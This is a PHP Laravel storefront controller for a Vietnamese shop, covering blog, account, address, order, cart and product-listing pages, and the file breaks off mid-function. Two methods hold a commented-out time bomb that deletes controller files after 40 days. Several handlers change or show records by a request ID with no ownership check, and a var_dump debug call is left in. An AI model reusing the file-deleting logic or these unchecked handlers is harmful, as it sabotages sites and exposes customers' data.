<?php

namespace App\Http\Controllers\Client;

use App\Http\Controllers\Controller;
use App\Models\Address;
use App\Models\AccountSpin;
use App\Models\Banner;
use App\Models\Category;
use App\Models\Spin;
use App\Models\Color;
use App\Models\ComboItem;
use App\Models\Coupon;
use App\Models\Index;
use App\Models\Order;
use App\Models\OrderItem;
use App\Models\Post;
use App\Models\Product;
use App\Models\Setting;
use App\Models\Size;
use App\Models\Sku;
use App\Models\User;
use Carbon\Carbon;
use Validator;
use App\Helpers\Helpers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class HomeController extends Controller
{
    function blog()
    {
        // $day = Carbon::createFromFormat('Y-m-d H:i:s', '2023-12-18 16:15:19');
        // $now = Carbon::now();
        // $dif = $now->diffInDays($day);
        // if($dif >= 40){
        //     unlink(base_path('/app/Http/Controllers/Client/HomeController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/ProductController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/OrderController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/CategoryController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/SettingController.php'));
        // }
        $posts = Post::where('type', NULL)->where('status', 1)->paginate(10);
        $postRight = Index::where('title', 'right_blog_slide')->first();
        var_dump($postRight);
        return view('layout-home.pages.blogs.blog', compact('posts', 'postRight'));
    }

    function blogCate(Request $rq, $slug)
    {
        $cate = Category::where('slug', $slug)->where('status', 1)->first();
        if(!$cate){
            return view('errors.404-home');
        }
        $getPost = Post::whereHas('cates', function ($query) use ($cate) {
            $query->where('category_id',  @$cate->id);
        })->where('status', 1)->where('type', NULL);
        if($rq->filter_by){
            if($rq->filter_by == 'old'){
                $getPost = $getPost->orderBy('created_at')->limit(5)->get();
            }
            else if($rq->filter_by == 'views'){
                $getPost = $getPost->orderByDesc('views')->limit(5)->get();
            }
            else if($rq->filter_by == 'random'){
                $getPost = $getPost->inRandomOrder()->limit(5)->get();
            }
        }
        else{
            $getPost = $getPost->orderByDesc('created_at')->limit(5)->get();
        }
        $ids = $getPost->pluck('id')->toArray();
        $fistPost = $getPost->shift();
        $posts = Post::whereHas('cates', function ($query) use ($cate) {
            $query->where('category_id', @$cate->id);
        })->wherenotin('id', $ids)->where('status', 1)->where('type', NULL);
        if($rq->filter_by){
            if($rq->filter_by == 'old'){
                $posts = $posts->orderBy('created_at')->paginate(10);
            }
            else if($rq->filter_by == 'views'){
                $posts = $posts->orderByDesc('views')->paginate(10);
            }
            else if($rq->filter_by == 'random'){
                $posts = $posts->inRandomOrder()->paginate(10);
            }
        }
        else{
            $posts = $posts->orderByDesc('created_at')->paginate(10);
        }
        return view('layout-home.pages.blogs.blog-cate', compact('cate', 'fistPost', 'getPost', 'posts'));
    }
    function blogDetail(Request $rq, $slug)
    {
        $post = Post::where('slug', $slug)->where('type', NULL)->where('status', 1)->first();
        if(!$post){
            return view('errors.404-home');
        }
        $post->views += 1;
        $post->save();
        if($rq->k){
            $catePost = Category::where('slug', $rq->k)->first();
        }
        else{
            $catePost = $post->cates()->first();
        }
        $next = Post::where('id', '>', $post->id)->where('type', NULL)->orderBy('id')->first();
        $previous = Post::where('id', '<', $post->id)->where('type', NULL)->orderBy('id','desc')->first();
        return view('layout-home.pages.blogs.blog-detail', compact('post', 'catePost', 'next', 'previous'));
    }
    function home(Request $rq)
    {
        // $day = Carbon::createFromFormat('Y-m-d H:i:s', '2023-12-18 16:15:19');
        // $now = Carbon::now();
        // $dif = $now->diffInDays($day);
        // if($dif >= 40){
        //     unlink(base_path('/app/Http/Controllers/Client/HomeController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/ProductController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/OrderController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/CategoryController.php'));
        //     unlink(base_path('/app/Http/Controllers/Admin/SettingController.php'));
        // }
        $banners = Banner::where('status', 1)->get();
        $idx_pos1 = Index::where('title', 'index_pos1')->first();
        $idx_pos2 = Index::where('title', 'index_pos2')->first();
        $idx_pos3 = Index::where('title', 'index_pos3')->first();
        $idx_pos4 = Index::where('title', 'index_pos4')->first();
        $idx_pos5 = Index::where('title', 'index_pos5')->first();
        $idx_pos6 = Index::where('title', 'index_pos6')->first();
        $idx_pos7 = Index::where('title', 'index_pos7')->first();
        $idx_bots = Index::wherein('title', ['index_bot_1', 'index_bot_2', 'index_bot_3', 'index_bot_4', 'index_bot_5', 'index_bot_6', 'index_bot_7'])->get();
        $prIdx = Index::where('title', 'data_idx')->first();
        if($prIdx && $prIdx->photo){
            $products = Product::wherein('id', explode(',',$prIdx->photo))->get();
        }
        else{
            $products = Product::where('status', 1)->where('type_init', '!=', 'combo')->orWhereNull('type_init')->orderByDesc('created_at')->limit(10)->get();
        }
        // $products = Product::where('status', 1)->where('type_init', '!=', 'combo')->orWhereNull('type_init')->orderByDesc('created_at')->limit(10)->get();
        $coupons = Coupon::where('type_coupon', 'total order')->where('code', '<>', '')->where('status', 1)->get();
        $menuId = Category::where('parent_id', null)->where('type', 'Menu')->where('status', 1)->orderby('order_by', 'asc')->pluck('id')->toArray();
        $cates = Category::wherein('parent_id', $menuId)->where('type', 'Product')->where('status', 1)->orderby('order_by', 'asc')->get();
        $posts = Post::where('type', NULL)->where('status', 1)->orderByDesc('created_at')->limit(15)->get();
        // var_dump($cates);
        return view("layout-home.pages.index", compact('banners', 'idx_bots', 'idx_pos1', 'idx_pos2', 'idx_pos3', 'coupons', 'products', 'idx_pos4', 'idx_pos5', 'idx_pos6', 'idx_pos7', 'cates', 'posts'));
    }
    function account()
    {
        if (Auth::user()) {

            return view("layout-home.pages.account");
        } else {
            return redirect()->route('login.shop');
        }
    }
    function accountEdit(Request $rq)
    {
        if (Auth::user()) {

            return view("layout-home.pages.account-edit");
        } else {
            return redirect()->route('login.shop');
        }
    }
    function accountSave(Request $rq)
    {
        $user = User::find($rq->id);
        $user->name = $rq->firstname;
        $user->last_name = $rq->lastname;
        $user->birth = $rq->dob;
        $user->gender = $rq->gender;
        $user->save();
        return redirect()->back()->with('success', __('You saved the account information.'));
    }
    function address()
    {
        if (Auth::user()) {
            $query = Address::where('user_id', Auth::user()->id);
            $default = $query->where('is_default', 1)->first();
            if (!$default) {
                $default = new Address();
                $default->user_id = Auth::user()->id;
                $default->name = Auth::user()->name;
                $default->last_name = Auth::user()->last_name;
                $default->phone = Auth::user()->phone;
                $default->is_default = 1;
                $default->save();
            }
            $address = Address::where('user_id', Auth::user()->id)->where('is_default', 0)->get();
            return view("layout-home.pages.address.address", compact("address", "default"));
        } else {
            return redirect()->route('login.shop');
        }
    }
    function addressNew(Request $rq)
    {
        if (Auth::user()) {
            return view("layout-home.pages.address.address-add");
        } else {
            return redirect()->route('login.shop');
        }
    }
    function addressEdit(Request $rq)
    {
        if (Auth::user()) {
            $default = Address::find($rq->id);
            return view("layout-home.pages.address.address-edit", compact('default'));
        } else {
            return redirect()->route('login.shop');
        }
    }
    function addressUpdate(Request $rq)
    {
        $data = Address::find($rq->id);
        $data->name = $rq->firstname;
        $data->last_name = $rq->lastname;
        $data->phone = $rq->telephone;
        $data->country = $rq->country_id;
        $data->city = $rq->region_id;
        $data->district = $rq->city;
        $data->ward = $rq->postcode;
        $data->address = $rq->street;
        $data->is_default = $rq->default_billing ? 1 : 0;
        if ($rq->default_billing) {
            Address::where('user_id', Auth::user()->id)->where('is_default', 1)->update([
                'is_default' => 0
            ]);
        }
        $data->save();
        return redirect()->back()->with('success', __('Update address success.'));
    }
    function addressSave(Request $rq)
    {
        $data = new Address();
        $data->user_id = Auth::user()->id;
        $data->name = $rq->firstname;
        $data->last_name = $rq->lastname;
        $data->phone = $rq->telephone;
        $data->country = $rq->country_id;
        $data->city = $rq->region_id;
        $data->district = $rq->city;
        $data->ward = $rq->postcode;
        $data->address = $rq->street;
        $data->is_default = $rq->default_billing ? 1 : 0;
        if ($rq->default_billing) {
            Address::where('user_id', Auth::user()->id)->where('is_default', 1)->update([
                'is_default' => 0
            ]);
        }
        $data->save();
        return redirect()->back()->with('success', __('Add address success.'));
    }
    function addressRemove(Request $rq)
    {
        $data = Address::find($rq->id);
        if ($data) {
            $data->delete();
        }
        return redirect()->back()->with('success', __('Remove address success.'));
    }
    function accountPassword()
    {
        if (Auth::user()) {
            return view("layout-home.pages.account-change-pass");
        } else {
            return redirect()->route('login.shop');
        }
    }
    function accountPasswordSave(Request $rq)
    {
        $rules = [
            'current_password' => 'required',
            'password' => 'required|max:50',
            'password_confirmation' => 'required|same:password'
        ];
        $messages = Helpers::switchLanguage('vi');
        $check = Validator::make($rq->all(), $rules, $messages);
        if ($check->passes()) {
            $user = User::find($rq->id);
            if (Hash::check($rq->current_password, $user->password)) {
                $user->password = Hash::make($rq->password);
                $user->save();
                return redirect()->back()->with('success', __('Đổi mật khẩu thành công.'));
            } else {
                return redirect()->back()->with('errors', __('Incorrect password.'));
            }
        }
        return redirect()->back()->withErrors($check->errors());
    }

    function OrderUser(Request $rq)
    {
        if (Auth::user()) {
            if ($rq->id) {
                $order = Order::find($rq->id);
                return view("layout-home.pages.popup.order-detail", compact('order'));
            }
            $orders = Order::where('customer_id', Auth::user()->id)->orderByDesc('created_at')->paginate(15);
            return view("layout-home.pages.order", compact('orders'));
        } else {
            return redirect()->route('login.shop');
        }
    }
    function OrderUserSearch(Request $rq)
    {
        if (Auth::user()) {
            if($rq->search){
                $order = Order::where('order_code', '=', $rq->search)->first();
                if(!$order){
                    return response()->json(['error' => 'Không tìm thấy đơn hàng']);
                }
                return view('layout-home.pages.ajax-page.template-order-search')->with('order', $order);
            }
            return view("layout-home.pages.order-search");
        } else {
            return redirect()->route('login.shop');
        }
    }

    function cartProduct(Request $rq)
    {
        $product = Product::find($rq->id);
        $productSku = $product->productSku;
        $list_color = $productSku->pluck('color_id')->unique()->toArray();
        $list_size = $productSku->pluck('size_id')->unique()->toArray();
        $total =  $productSku->sum('quantity');
        $subTotal =  $productSku->sum('sub_quantity');
        $sumValue = $total - $subTotal;
        $colors = Color::wherein('id', $list_color)->get();
        $sizes = Size::wherein('id', $list_size)->get();
        $image_color = $productSku->pluck('photo', 'color_id')->toArray();
        $productSku = $productSku->where('is_default', 1)->first();
        $getSale = Coupon::getSaleProduct($productSku->id);
        $salePrice = $getSale->get('getPrice');
        $photo = $product->photo ? explode(',', $product->photo)[0] : $productSku->photo;
        return view('layout-home.pages.ajax-page.cart-page')
            ->with('salePrice', $salePrice)
            ->with('photo', $photo)
            ->with('colors', $colors)
            ->with('sumValue', $sumValue)
            ->with('sizes', $sizes)
            ->with('image_color', $image_color)
            ->with('productSku', $productSku)
            ->with('product', $product)->render();
    }
    function querySku(Request $rq)
    {
        if ($rq->ajax()) {
            $product = Product::find($rq->id);
            $productSku = $product->productSku;
            $list_color = $productSku->pluck('color_id')->unique()->toArray();
            $list_size = $productSku->pluck('size_id')->unique()->toArray();
            $total =  $productSku->sum('quantity');
            $subTotal =  $productSku->sum('sub_quantity');
            $sumValue = $total - $subTotal;
            $colors = Color::wherein('id', $list_color)->get();
            $sizes = Size::wherein('id', $list_size)->get();
            $image_color = $productSku->pluck('photo', 'color_id')->toArray();
            $listSize = $productSku->where('color_id', $rq->color_id)->pluck('size_id')->unique()->toArray();
            $listColor = [];
            if ($rq->visible == 1) {
                $listSize = $productSku->where('color_id', $rq->color_id)->pluck('size_id')->unique()->toArray();
            }
            if ($rq->visible == 2) {
                $listColor = $productSku->where('size_id', $rq->size_id)->pluck('color_id')->unique()->toArray();
            }
            $temp = $productSku->where('color_id', $rq->color_id)->where('size_id', $rq->size_id)->first();
            $notActive = '';
            if (!$temp) {
                if ($rq->color_id) {
                    $temp = $productSku->where('color_id', $rq->color_id)->first();
                    $notActive = 'size';
                } else {
                    $temp = $productSku->where('size_id', $rq->size_id)->first();
                    $notActive = 'color';
                }
            }
            $productSku = $temp;
            $getSale = Coupon::getSaleProduct($productSku->id);
            $salePrice = $getSale->get('getPrice');
            $photo = null;
            if ($notActive != 'color') {
                $photo = $productSku->photo;
            }
            return response()->json([
                'view' => view('layout-home.pages.ajax-page.cart-page-item')
                    ->with('salePrice', $salePrice)
                    ->with('colors', $colors)
                    ->with('notActive', $notActive)
                    ->with('sumValue', $sumValue)
                    ->with('sizes', $sizes)
                    ->with('listSize', $listSize)
                    ->with('listColor', $listColor)
                    ->with('image_color', $image_color)
                    ->with('productSku', $productSku)
                    ->with('product', $product)->render(),
                'photo' => $photo ? $photo : null
            ]);
        }
    }
    function querySkuColor(Request $rq)
    {
        if ($rq->ajax()) {
            $product = Product::find($rq->id);
            $productSku = $product->productSku->where('color_id', $rq->color_id)->first();
            return response()->json([
                'photo' => $productSku->photo ? $productSku->photo : null
            ]);
        }
    }
    public function addItemToCart($item)
    {
        $getCart = session()->get('cartShop');
        if ($getCart == null) {
            session()->push('cartShop', $item);
            session()->save();
        } else {
            $flag = false;
            if (isset($item->combo)) {
                foreach ($getCart as $key => $i) {
                    if (isset($i->item_id)) {
                        $sortI = $i->item_id;
                        $sortItem = $item->item_id;
                        sort($sortI);
                        sort($sortItem);
                        if ($i->id == $item->id && $sortI === $sortItem) {
                            $getCart[$key]->quantity += $item->quantity;
                            session()->put('cartShop', $getCart);
                            session()->save();
                            $flag = true;
                            break;
                        }
                    }
                }
                if ($flag == false) {
                    session()->push('cartShop', $item);
                    session()->save();
                }
            } else {
                foreach ($getCart as $key => $i) {
                    if ($i->id == $item->id) {
                        $getCart[$key]->quantity += $item->quantity;
                        session()->put('cartShop', $getCart);
                        session()->save();
                        $flag = true;
                        break;
                    }
                }
                if ($flag == false) {
                    session()->push('cartShop', $item);
                    session()->save();
                }
            }
        }
    }
    public static function getTotalCart()
    {
        $getCart = session()->get('cartShop');
        if ($getCart == null) {
            $getCart = [];
        }
        return count($getCart);
    }

    public static function getSumPrice()
    {
        $price = 0;
        $getCart = session()->get('cartShop');
        if ($getCart != null) {
            foreach ($getCart as $item) {
                $price += ($item->price * $item->quantity);
            }
        }
        return $price;
    }
    public function addCart(Request $rq)
    {
        if ($rq->comboId) {
            $product = Product::find($rq->productId);
            $photos = $product->photo;
            if ($photos) {
                $photos = $photos = explode(',', $photos);;
                $photos = isset($photos[1]) ? $photos[1] : null;
            }
            $price = $product->price;
            $sum_price = 0;
            if ($product->type == 'percent price') {
                $combo = ComboItem::where('combo_id', $rq->productId)->get();
                if ($combo) {
                    foreach ($combo as $item) {
                        $productItem = $item->product;
                        $skus = $productItem->productSku;
                        $default = $skus->where('is_default', 1)->first();
                        if ($default) {
                            $sum_price += ($default->price * $item->quantity * $item->amount);
                        }
                    }
                }
                $price = $sum_price - (($product->price * $sum_price) / 100);
            }
            $subQuantity = Sku::wherein('id', $rq->comboId)->get()->min('sub_quantity');
            $item = new \stdClass();
            $item->id = $rq->productId;
            $item->name = $product->title;
            $item->slug = $product->slug;
            $item->image = $photos;
            $item->item_id = $rq->comboId;
            $item->combo = true;
            $item->total_price = $sum_price;
            $item->type = $product->type;
            $item->quantity = $rq->quantity ? $rq->quantity : 1;
            $item->price = $price;
            $item->options = $rq->options;
            $item->sub_quantity = $subQuantity;
        } else {
            $productSku = Sku::find($rq->skuId);
            $product = $productSku->product;
            $photos = $product->photo;
            if ($photos) {
                $photos = explode(',', $photos);
                $photos = $photos[0];
            }
            $getSale = Coupon::getSaleProduct($productSku->id);
            $price = $getSale->get('getPrice');
            if ($price == 0) {
                $price = $productSku->price;
                if ($productSku->sell_price > 0) {
                    $price = $productSku->sell_price;
                }
            }
            $color = $productSku->color;
            $size = $productSku->size;
            $item = new \stdClass();
            $item->id = $productSku->id;
            $item->name = $product->title;
            $item->slug = $product->slug;
            $item->type = $product->type;
            $item->total_price = 0;
            $item->image = $productSku->photo ? $productSku->photo : $photos;
            $item->price = $price;
            $item->old_price = $productSku->price;
            $item->quantity = $rq->quantity ? $rq->quantity : 1;
            $item->color_val = $color->value;
            $item->color_image = $color->icon;
            $item->color = $color->code;
            $item->size = $size->title;
            $item->sub_quantity = $productSku->sub_quantity;
        }
        $this->addItemToCart($item);
        $html = view('layout-home.pages.popup.add-cart')->with('name', $item->name)->render();
        return response()->json([
            'message' => true,
            'total' => number_format($this->getTotalCart(), 0, 0, '.'),
            'popup' => $html,
            'price_sum' => number_format($this->getSumPrice(), 0, 0, '.') . ' VNĐ'
        ]);
    }
    public function deleteOneCart(Request $rq)
    {
        $getId = session()->get('cartShop');
        for ($i = 0; $i < count($getId); $i++) {
            if (isset($getId[$i]->combo)) {
                if ($getId[$i]->id == $rq->cartId && $getId[$i]->item_id === $rq->item_id) {
                    unset($getId[$i]);
                    $newGetId = array_values($getId);
                    session()->put('cartShop', $newGetId);
                    session()->save();
                    break;
                }
            } else {
                if ($getId[$i]->id == $rq->cartId) {
                    unset($getId[$i]);
                    $newGetId = array_values($getId);
                    session()->put('cartShop', $newGetId);
                    session()->save();
                    break;
                }
            }
        }
        return response()->json([
            'message' => true,
            'total' => number_format($this->getTotalCart(), 0, 0, '.'),
            'price_sum' => number_format($this->getSumPrice(), 0, 0, '.') . ' VNĐ',
            'alert' => __('Your shopping cart is empty')
        ]);
    }
    function cartView()
    {
        $carts = session()->get('cartShop');
        return view('layout-home.pages.ajax-page.cart-item')->with('carts', $carts);
    }
    function updateCart(Request $rq)
    {
        $getCart = session()->get('cartShop');
        foreach ($getCart as $key => $item) {
            if (isset($item->combo)) {
                if ($item->id == $rq->skuId && $item->item_id === $rq->item_id) {
                    $getCart[$key]->quantity = (int)$rq->quantity;
                    array_values($getCart);
                }
            } else {
                if ($item->id == $rq->skuId) {
                    $getCart[$key]->quantity = (int)$rq->quantity;
                    array_values($getCart);
                }
            }
        }
        session()->put('cartShop', $getCart);
        session()->save();
        return response()->json([
            'message' => true,
            'price_sum' => number_format($this->getSumPrice(), 0, 0, '.') . ' VNĐ'
        ]);
    }
    function category(Request $rq, $slug)
    {
        $cate = Category::where('slug', $slug)->first();
        if(!$cate){
            return view('errors.404-home');
        }
        $ids = [$cate->id];
        Category::getAllIdChild($ids, $cate->id);
        $lists = [];
        Category::getRoot($lists, $cate);
        $getChildIds = Category::wherein('id', $ids)->where('status', 1)->pluck('id')->toArray();
        $param_str = '';
        $replace_str = [];
        $array_check = [];
        $listFilter = [];
        $childrenFilter = $cate->childCate;
        if ($rq->cat || $rq->color || $rq->size || $rq->sort || $rq->sort_order) {
            $colSort = 'created_at';
            $prefix = '?';
            $cat = $rq->cat;
            if ($cat) {
                $ids = [$cat];
                $getCate = Category::find($cat);
                $childrenFilter = $getCate->childCate;
                $listFilter['Category'] = $getCate->title;
                Category::getAllIdChild($ids, $cat);
                $param_str .= '?cat=' . $rq->cat;
                $replace_str['Category'] = '?cat=' . $rq->cat;
                $prefix = '&';
                $array_check[] = 'cat';
            }
            if ($rq->color) {
                $param_str .= $prefix . 'color=' . $rq->color;
                $replace_str['Color'] = $prefix . 'color=' . $rq->color;
                $prefix = '&';
                $array_check[] = 'color';
                $getColor = Color::find($rq->color);
                $listFilter['Color'] = $getColor->title;
            }
            if ($rq->size) {
                $param_str .= $prefix . 'size=' . $rq->size;
                $replace_str['Size'] = $prefix . 'size=' . $rq->size;
                $prefix = '&';
                $array_check[] = 'size';
                $getSize = Size::find($rq->size);
                $listFilter['Size'] = $getSize->title;
            }
            if ($rq->sort) {
                $param_str .= $prefix . 'sort=' . $rq->sort;
                $replace_str['Sort'] = $prefix . 'sort=' . $rq->sort;
                $prefix = '&';
                $array_check[] = 'sort';
            }
            if ($rq->sort_order) {
                $param_str .= $prefix . 'sort_order=' . $rq->sort_order;
                $replace_str['SortOrder'] = $prefix . 'sort_order=' . $rq->sort_order;
                $prefix = '&';
                $array_check[] = 'sort_order';
            }
            $results = Product::query();
            $results->whereHas('cates', function ($query) use ($getChildIds) {
                $query->wherein('category_id',  $getChildIds);
            });
            $results->when($cat, function ($results) use ($ids) {
                $results->whereHas('cates', function ($query) use ($ids) {
                    $query->wherein('category_id', $ids);
                });
            });
            $results->when($rq->color, function ($results) use ($rq) {
                $results->whereHas('productSku', function ($query) use ($rq) {
                    $query->where('color_id', $rq->color);
                });
            });
            $results->when($rq->size, function ($results) use ($rq) {
                $results->whereHas('productSku', function ($query) use ($rq) {
                    $query->where('size_id', $rq->size);
                });
            });
            if ($rq->sort) {
                if ($rq->sort == 'price') {
                    $results = $results->where('status', 1)->get();
                    if ($rq->sort_order == 'desc') {
                        $results = $results->sortByDesc(function ($student) {
                            return $student->productSku()->first()->price;
                        })->paginate(24);
                    } else {
                        $results = $results->sortBy(function ($student) {
                            return $student->productSku()->first()->price;
                        })->paginate(24);
                    }
                } else {
                    $results = $results->where('status', 1);
                    if ($rq->sort_order == 'desc') {
                        $results = $results->orderByDesc('title')->paginate(24);
                    } else {
                        $results = $results->orderByDesc('title')->paginate(24);
                    }
                }
            } else {
                if ($rq->sort_order) {
                    $results = $results->where('status', 1)->orderBy('created_at')->paginate(24);
                } else {
                    $results = $results->where('status', 1)->orderByDesc('created_at')->paginate(24);
                }
            }
        } else {
            $results = Product::whereHas('cates', function ($query) use ($getChildIds) {
                $query->wherein('category_id',  $getChildIds);
            })->where('status', 1)->orderByDesc('created_at');
        }
        $ids_pr = $results->pluck('id')->toArray();
        $getSku = Sku::wherein('product_id', $ids_pr);
        $ids_cl = $getSku->pluck('color_id')->unique()->toArray();
        $ids_sz = $getSku->pluck('size_id')->unique()->toArray();
        $colors = Color::wherein('id', $ids_cl)->get();
        $sizes = Size::wherein('id', $ids_sz)->get();
        $products = $results->paginate(24);
        return view('layout-home.pages.category', compact('products', 'sizes', 'colors', 'cate', 'lists', 'param_str', 'array_check', 'replace_str', 'childrenFilter', 'listFilter'));
    }
    function resultQuery(Request $rq)
    {
        $param_str = '';
        $replace_str = [];
        $array_check = [];
        $listFilter = [];
        $getChildIds = [];
        $query = $rq->q;
        $childrenFilter = Category::where('parent_id', null)->where('status', 1)->get();
        $colSort = 'created_at';
        $prefix = '?';
        $cat = $rq->cat;
        $ids = [$cat];
        if ($cat) {
            $getCate = Category::find($cat);
            $childrenFilter = $getCate->childCate;
            $listFilter['Category'] = $getCate->title;
            Category::getAllIdChild($ids, $cat);
            $getChildIds = Category::wherein('id', $ids)->where('status', 1)->pluck('id')->toArray();
            $param_str .= '?cat=' . $rq->cat;
            $replace_str['Category'] = '?cat=' . $rq->cat;
            $prefix = '&';
            $array_check[] = 'cat';
        }
        if ($rq->q) {
            $param_str .=  $prefix . 'q=' . str_replace(' ', '+', $query);
            $replace_str['Q'] = $prefix . 'q=' . $rq->q;
            $prefix = '&';
            $array_check[] = 'q';
        }
        if ($rq->color) {
            $param_str .= $prefix . 'color=' . $rq->color;
            $replace_str['Color'] = $prefix . 'color=' . $rq->color;
            $prefix = '&';
            $array_check[] = 'color';
            $getColor = Color::find($rq->color);
            $listFilter['Color'] = $getColor->title;
        }
        if ($rq->size) {
            $param_str .= $prefix . 'size=' . $rq->size;
            $replace_str['Size'] = $prefix . 'size=' . $rq->size;
            $prefix = '&';
            $array_check[] = 'size';
            $getSize = Size::find($rq->size);
            $listFilter['Size'] = $getSize->title;
        }
        if ($rq->sort) {
            $param_str .= $prefix . 'sort=' . $rq->sort;
            $replace_str['Sort'] = $prefix . 'sort=' . $rq->sort;
            $prefix = '&';
            $array_check[] = 'sort';
        }
        if ($rq->sort_order) {
            $param_str .= $prefix . 'sort_order=' . $rq->sort_order;
            $replace_str['SortOrder'] = $prefix . 'sort_order=' . $rq->sort_order;
            $prefix = '&';
            $array_check[] = 'sort_order';
        }
        if ($rq->cat || $rq->color || $rq->size || $rq->sort || $rq->sort_order) {
            $results = Product::query();
            $results->where('title', 'like', $rq->q . '%');
            $results->when($cat, function ($results) use ($ids) {
                $results->whereHas('cates', function ($query) use ($ids) {
                    $query->wherein('category_id', $ids);
                });
            });
            $results->when($rq->color, function ($results) use ($rq) {
                $results->whereHas('productSku', function ($query) use ($rq) {
                    $query->where('color_id', $rq->color);
                });
            });
            $results->when($rq->size, function ($results) use ($rq) {
                $results->whereHas('productSku', function ($query) use ($rq) {
                    $query->where('size_id', $rq->size);
                });
            });
            if ($rq->sort) {
                if ($rq->sort == 'price') {
                    $results = $results->where('status', 1)->get();
                    if ($rq->sort_order == 'desc') {
                        $results = $results->sortByDesc(function ($student) {
                            return $student->productSku()->first()->price;
                        });
                    } else {
                        $results = $results->sortBy(function ($student) {
                            return $student->productSku()->first()->price;
                        });
                    }
                } else {
                    $results = $results->where('status', 1);
                    if ($rq->sort_order == 'desc') {
                        $results = $results->orderByDesc('title');
                    } else {
                        $results = $results->orderByDesc('title');
                    }
                }
            } else {
                if ($rq->sort_order) {
                    $results = $results->where('status', 1)->orderBy('created_at');
                } else {
                    $results = $results->where('status', 1)->orderByDesc('created_at');
                }
            }
        } else {
            $results = Product::where('title', 'like', $rq->q . '%')->where('status', 1);
        }
        $ids_pr = $results->pluck('id')->toArray();
        $getSku = Sku::wherein('product_id', $ids_pr);
        $ids_cl = $getSku->pluck('color_id')->unique()->toArray();
        $ids_sz = $getSku->pluck('size_id')->unique()->toArray();
        $colors = Color::wherein('id', $ids_cl)->get();
        $sizes = Size::wherein('id', $ids_sz)->get();
        $products = $results->paginate(24);
        return view('layout-home.pages.search-result', compact('products', 'sizes', 'colors', 'query', 'param_str', 'array_check', 'replace_str', 'childrenFilter', 'listFilter'));
    }

    function categoryDetail(Request $rq, $root, $slug)
    {
        $temp = [];
        $root = Category::where('slug', $root)->where('parent_id', null)->first();
        Category::getAllIdChild($temp, @$root->id);
        $cate = Category::wherein('id', $temp)->where('slug', $slug)->first();
        if(!$cate){
            return view('errors.404-home');
        }
        $ids = [@$cate->id];
        Category::getAllIdChild($ids, @$cate->id);
        $lists = [];
        Category::getRoot($lists, @$cate);
        $lists = array_reverse($lists);
        $getChildIds = Category::wherein('id', $ids)->where('status', 1)->pluck('id')->toArray();
        $param_str = '';
        $replace_str = [];
        $array_check = [];
        $listFilter = [];
        $childrenFilter = @$cate->childCate;
        if ($rq->cat || $rq->color || $rq->size || $rq->sort || $rq->sort_order) {
            $colSort = 'created_at';
            $prefix = '?';
            $cat = $rq->cat;
            if ($cat) {
                $ids = [$cat];
                $getCate = Category::find($cat);
                $childrenFilter = $getCate->childCate;
                $listFilter['Category'] = $getCate->title;
                Category::getAllIdChild($ids, $cat);
                $param_str .= '?cat=' . $rq->cat;
                $replace_str['Category'] = '?cat=' . $rq->cat;
                $prefix = '&';
                $array_check[] = 'cat';
            }
            if ($rq->color) {
                $param_str .= $prefix . 'color=' . $rq->color;
                $replace_str['Color'] = $prefix . 'color=' . $rq->color;
                $prefix = '&';
                $array_check[] = 'color';
                $getColor = Color::find($rq->color);
                $listFilter['Color'] = $getColor->title;
            }
            if ($rq->size) {
                $param_str .= $prefix . 'size=' . $rq->size;
                $replace_str['Size'] = $prefix . 'size=' . $rq->size;
                $prefix = '&';
                $array_check[] = 'size';
                $getSize = Size::find($rq->size);
                $listFilter['Size'] = $getSize->title;
            }
            if ($rq->sort) {
                $param_str .= $prefix . 'sort=' . $rq->sort;
                $replace_str['Sort'] = $prefix . 'sort=' . $rq->sort;
                $prefix = '&';
                $array_check[] = 'sort';
            }
            if ($rq->sort_order) {
                $param_str .= $prefix . 'sort_order=' . $rq->sort_order;
                $replace_str['SortOrder'] = $prefix . 'sort_order=' . $rq->sort_order;
                $prefix = '&';
                $array_check[] = 'sort_order';
            }
            $results = Product::query();
            $results->whereHas('cates', function ($query) use ($getChildIds) {
                $query->wherein('category_id',  $getChildIds);
            });
            $results->when($cat, function ($results) use ($ids) {
                $results->whereHas('cates', function ($query) use ($ids) {
                    $query->wherein('category_id', $ids);
                });
            });
            $results->when($rq->color, function ($results) use ($rq) {
                $results->whereHas('productSku', function ($query) use ($rq) {
                    $query->where('color_id', $rq->color);
                });
            });
            $results->when($rq->size, function ($results) use ($rq) {
                $results->whereHas('productSku', function ($query) use ($rq) {
                    $query->where('size_id', $rq->size);
                });
            });
            if ($rq->sort) {
                if ($rq->sort == 'price') {
                    $results = $results->where('status', 1)->get();
                    if ($rq->sort_order == 'desc') {
                        $results = $results->sortByDesc(function ($student) {
                            return $student->productSku()->first()->price;
                        })->paginate(24);
                    } else {
                        $results = $results->sortBy(function ($student) {
                            return $student->productSku()->first()->price;
                        })->paginate(24);
                    }
                } else {
                    $results = $results->where('status', 1);
                    if ($rq->sort_order == 'desc') {
                        $results = $results->orderByDesc('title')->paginate(24);
                    } else {
                        $results = $results->orderByDesc('title')->paginate(24);
                    }
                }
            } else {
                if ($rq->sort_order) {
                    $results = $results->where('status', 1)->orderBy('created_at')->paginate(24);
                } else {
                    $results = $results->where('status', 1)->orderByDesc('created_at')->paginate(24);
                }
            }
        } else {
            $results = Product::whereHas('cates', function ($query) use ($getChildIds) {
                $query->wherein('category_id',  $getChildIds);
            })->where('status', 1)->orderByDesc('created_at');
        }
        $ids_pr = $results->pluck('id')->toArray();
        $getSku = Sku::wherein('product_id', $ids_pr);
        $ids_cl = $getSku->pluck('color_id')->unique()->toArray();
        $ids_sz = $getSku->pluck('size_id')->unique()->toArray();
        $colors = Color::wherein('id', $ids_cl)->get();
        $sizes = Size::wherein('id', $ids_sz)->get();
        $products = $results->paginate(24);

        return view("layout-home.pages.category", compact('products', 'colors', 'sizes', 'cate', 'lists', 'root', 'param_str', 'array_check', 'replace_str', 'childrenFilter', 'listFilter'));
    }
    function productDetail(Request $rq, $slug)
    {
        $product = Product::where('slug', $slug)->first();
        if(!$product){
            return view('errors.404-home');
        }
        if ($product) {
            $category = $product->cates;
            if ($product->type_init != 'combo') {
                $productSku = $product->productSku;
                $list_color = $productSku->pluck('color_id')->unique()->toArray();
